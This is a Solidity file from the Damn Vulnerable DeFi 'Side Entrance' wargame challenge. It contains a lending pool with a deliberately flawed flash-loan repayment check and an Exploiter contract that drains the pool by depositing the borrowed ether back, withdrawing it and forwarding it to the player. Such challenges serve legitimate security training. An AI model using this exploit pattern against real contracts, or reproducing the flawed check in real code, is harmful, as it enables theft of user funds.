// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
import {Test, console} from "forge-std/Test.sol";

interface IFlashLoanEtherReceiver {
    function execute() external payable;
}

contract SideEntranceLenderPool {
    mapping(address => uint256) public balances;

    error RepayFailed();

    event Deposit(address indexed who, uint256 amount);
    event Withdraw(address indexed who, uint256 amount);

    function deposit() external payable {
        unchecked {
            balances[msg.sender] += msg.value;
        }
        emit Deposit(msg.sender, msg.value);
    }

    function withdraw() external {
        uint256 amount = balances[msg.sender];

        delete balances[msg.sender];
        emit Withdraw(msg.sender, amount);

        SafeTransferLib.safeTransferETH(msg.sender, amount);
    }

    function flashLoan(uint256 amount) external {
        uint256 balanceBefore = address(this).balance;
        console.log(amount);
        IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

        if (address(this).balance < balanceBefore) {
            revert RepayFailed();
        }
    }
}

contract Exploiter is IFlashLoanEtherReceiver {
    SideEntranceLenderPool public sideEntrance;
    address player;

    constructor(SideEntranceLenderPool _sideEntrance, address _player){
        sideEntrance = SideEntranceLenderPool(_sideEntrance);
        player = _player;
    }

    function initiateLoan() public payable {
        console.log("starting flash loan");
        sideEntrance.flashLoan(1000 ether);
    }

    function execute() external payable override{
        console.log(msg.value);
        sideEntrance.deposit{value: address(this).balance}();
    }

    function withdraw() external {
        sideEntrance.withdraw();
    }

    function deposit() external payable{

    }


    fallback() external payable{
        console.log("starting fallback");
        (bool s, ) = payable(player).call{value: msg.value}("");
    }
}
